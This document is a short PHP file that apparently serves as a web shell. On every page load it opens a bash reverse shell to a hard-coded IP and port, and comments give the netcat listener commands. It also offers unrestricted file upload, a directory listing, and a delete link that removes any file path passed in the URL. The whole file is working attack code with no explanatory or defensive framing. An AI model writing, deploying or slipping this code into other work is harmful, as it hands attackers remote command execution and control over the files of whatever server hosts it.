<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Reverse shell
$ip = '192.168.1.63';
$port = 2200;
$shell = "/bin/bash";
$cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
//Check if we can run the command
exec($cmd);

// Command to run on "listen" machine using osx 
// nc -l 2200
// nc -l -p 2200

// File upload
if (isset($_FILES['file'])) {
    $targetDir = './';
    $targetFile = $targetDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        echo "File uploaded successfully.<br>";
    } else {
        echo "Error uploading file.<br>";
    }
}

// List files
$files = scandir('./');
foreach ($files as $file) {
    if ($file != '.' && $file != '..') {
        echo "<a href='?delete=$file'>Delete</a> <a href='$file'>Go to $file</a>\n<br><br>";
    }
}

// Delete file
if (isset($_GET['delete'])) {
    $fileToDelete = $_GET['delete'];
    if (file_exists($fileToDelete)) {
        unlink($fileToDelete);
        echo "File deleted successfully.<br>";
    } else {
        echo "File not found.<br>";
    }
}
?>
<form action="index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>